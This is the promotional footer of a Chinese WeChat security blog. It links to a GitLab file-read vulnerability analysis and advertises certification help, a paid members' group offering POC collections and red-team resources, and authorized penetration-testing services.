- [CVE-2026-85706：GitLab 未授权任意本地文件读取漏洞分析](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247491791&idx=1&sn=efd9a621d75549b997d57f2c16f2cb9a&scene=21#wechat_redirect)  
  
  
- [HAPPY-JS v1.6 更新说明：被动抓资产，主动做测试](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247491784&idx=1&sn=4fac1524c937b692258610936792d4f1&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSYrkHE64CbwTUmhUBWDUKshh5tLvdjqGiaYtxP22yVDegxNdhy9ZQa6fPnYtpA0oqNJurgOV6uib2hLdYPGToydcZo4gxy6h73ww/640?wx_fmt=other&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=18 "")  
  
**关于我们:**  
  
感谢各位大佬们关注-不秃头的安全，后续会坚持更新渗透漏洞思路分享、安全测试、好用工具分享以及挖掘SRC思路等文章，同时会组织不定期抽奖，希望能得到各位的关注与支持，考证请加联系vx咨询。  
- ## 1. 需要考以下各类安全证书的可以联系  
  
①Cn*d  
，NCC，NVDB🀄️高漏洞证书  
  
②CNNVD中高\漏洞情报\ 一二三级支撑单位均可协助获得  
  
③  
CISP、PTE/PTS、CISP-DSG、IRE/IRS、NISP一二级、PMP、CCSK、CISSP/CCSP、CISAW各种类、CCRC\CCSC、itil、软考中高级、CDSP各种类、CISA，oscp等等巨优惠。ISO27001、ITss服务项目经理报名等下证即可，证书组团报更便宜，可对公，可开专普票。以下是其他全部证书  
  
【腾讯文档】【信息安全 数据安全 IT认证证书】～不秃头的安全Vx:Meditation0723  
  
https://docs.qq.com/doc/DZmtOckpOakJrcFVv?[#]()  
  
  
想加群下方二维码，群过期或群满加下方vx拉：  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/I2dhkmhKrSbG89tNztJrnl85CUic1x2BicPeXrIWRhL6EkKzdwIEP0IAbDUTMXdEgjEOkkQ0JoXVoxM42PN6Zhr3Gic5XMnYDSvibaBlicJVnR50/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=14 "")  
  
  
- ## 2. 需要入星球的可以私聊优惠  
  
```
1、src、cnxd、cnnxd、POC专项漏洞知识库，包含原理、挖掘技巧、实战案例2、fafo/零零信安 高级会员key3、全网搜集POC在线文档，详情poc及证明截图（3000+以上文章）4、知识星球专属微信“内部圈子交流群”5、攻防演练资源分享（免杀、溯源、钓鱼等）6、新鲜工具分享7、不定期有工作招聘内推（工作/护网内推）8、19个专栏会持续更新~提前续费有优惠，好用不贵很实惠
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/I2dhkmhKrSbibf0x9wclCn8G3wZvSwHdqlPoeyuiadjibjGVs7LeiakgAspdj4icCctCXWQubdpwmYfTd9qBxs9Nzq24Vmyjv1vRic739c7eVrLw4/640?wx_fmt=jpeg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/I2dhkmhKrSbjSyXpibvbKGGVExnwbsZTU8mtydbiaDjtk1HyribQOwZxrGvDs5OEX2qhZJicRdib9Vq6sQ0dtgCEsgTS6Vtb0hU4Tv5voHYRMpew/640?wx_fmt=other&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=25 "")  
## 3、其他合作（合法合规）  
  
1、承接红蓝攻防、渗透、安全意识培训、基线核查及加固、应急响应、重保防守、代码审计等安全项目（须授权），需要攻防团队或岗位招聘都可代发、代招（灰黑勿扰）；  
  
2、各位安全老板需要文章推广的请私聊，承接合法合规推广文章发布，可直发、可按产品编辑推广；  
合作、推广代发、安全项目、岗位代招均可发布；  
  
3、接受脱敏投稿,送一年知识星球及礼包。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/I2dhkmhKrSYO1oTTszzW8liaTNnjWibXBMPYT8otMN5wc39GJicyeJGz3Dem9hwMfcJTIiaAGcaZdmF9eZLscrhxtz08VeibZ8qsMiaDMTmGdmPus/640?wx_fmt=other&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
